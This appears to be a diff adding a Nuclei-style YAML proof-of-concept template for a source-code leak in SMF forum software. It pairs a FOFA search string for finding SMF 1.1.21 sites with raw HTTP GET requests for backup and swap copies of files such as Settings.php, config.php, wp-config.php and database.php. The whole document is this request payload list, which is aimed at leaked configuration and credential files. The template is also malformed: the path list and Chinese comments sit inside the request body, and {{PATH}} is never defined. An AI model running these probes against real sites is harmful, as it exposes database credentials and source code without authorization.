@@ -1,0 +1,132 @@
+id: poc-dxrg08orhgn7a8sb
+info:
+  name: SMF 系统存在源码泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dxrg08orhgn7a8sb'
+  tags: other,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dxrg08orhgn7a8sb
+    fofa: body="Powered by SMF 1.1.21"
+http:
+- raw:
+  - 'GET /index.php~ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    Accept: text/html,application/xhtml+xml
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: keep-alive
+
+
+    批量 HTTP 请求模板，直接替换路径即可'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET {{PATH}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    Accept: text/html,application/xhtml+xml
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: keep-alive
+
+
+    文件泄露的 Payload 路径
+
+    /index.php~
+
+    /index.php.bak
+
+    /index.php.old
+
+    /index.php.orig
+
+    /index.php.save
+
+    /index.php.swp
+
+    /index.php.swo
+
+    /index.php.tmp
+
+    /Settings.php~
+
+    /Settings.php.bak
+
+    /Settings.php.old
+
+    /Settings.php.swp
+
+    /config.php~
+
+    /config.php.bak
+
+    /config.php.old
+
+    /config.php.swp
+
+    /configuration.php~
+
+    /configuration.php.bak
+
+    /wp-config.php~
+
+    /wp-config.php.bak
+
+    /database.php~
+
+    /database.php.bak
+
+    /conn.php~
+
+    /conn.php.bak
+
+    /admin.php~
+
+    /admin.php.bak
+
+    /login.php~
+
+    /login.php.bak
+
+    /api.php~
+
+    /api.php.bak
+
+    /Subs.php~
+
+    /Subs.php.bak
+
+    /QueryString.php~
+
+    /QueryString.php.bak
+
+    /Security.php~
+
+    /Security.php.bak
+
+    /Load.php~
+
+    /Load.php.bak
+
+    /Errors.php~
+
+    /Errors.php.bak'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
